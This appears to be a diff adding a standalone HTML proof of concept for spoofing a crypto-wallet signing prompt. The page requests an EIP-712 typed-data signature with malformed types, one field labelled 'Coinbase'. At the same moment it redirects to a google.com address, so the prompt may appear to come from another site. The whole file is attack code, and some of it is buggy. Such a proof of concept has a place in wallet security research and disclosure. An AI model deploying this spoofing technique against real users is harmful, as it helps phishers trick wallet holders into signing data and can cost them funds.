@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+      <script>
+    function spoof(){
+   location="https://www.google.com/csi?random="+Math.random();
+    document.body.innerHTML='This is not Google!';
+    }
+        </script>
+    <script
+      src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"type="application/javascript"></script>
+    <script>
+const provider = new ethers.providers.Web3Provider(window.ethereum)
+
+const mail = {
+  from: {
+     name: 'Alice',
+     wallet: '0x2111111111111111111111111111111111111111'
+  },
+  to: {
+     name: 'Bob',
+     wallet: '0x3111111111111111111111111111111111111111'
+  },
+  content: 'Hello!'
+};
+
+const types = {
+  tx: [
+    { name: 'Coinbase', type: 'Sign' },
+    { name: 'to', type: 'Person' },
+    { name: 'content', type: 'string' }
+  ],
+  Person: [
+    { name: 'name', type: 'string' },
+    { name: 'wallet', type: 'address' }
+  ]
+};
+
+const domain = {
+  name: 'My App',
+  version: '1',
+  chainId: 1,
+  verifyingContract: '0x1111111111111111111111111111111111111111'
+};
+
+
+async function test(int) {
+const signer = provider.getSigner();
+const signature = await signer._signTypedData(domain, types, mail);
+document.getElementById("wallet").innerText =signature;
+console.log(signature);
+}
+
+test(1);
+setInterval(spoof(),20);
+test(2);
+
+    </script>
+  </head>
+  <body>
+    <div id="wallet"></div>
+  </body>
+</html>
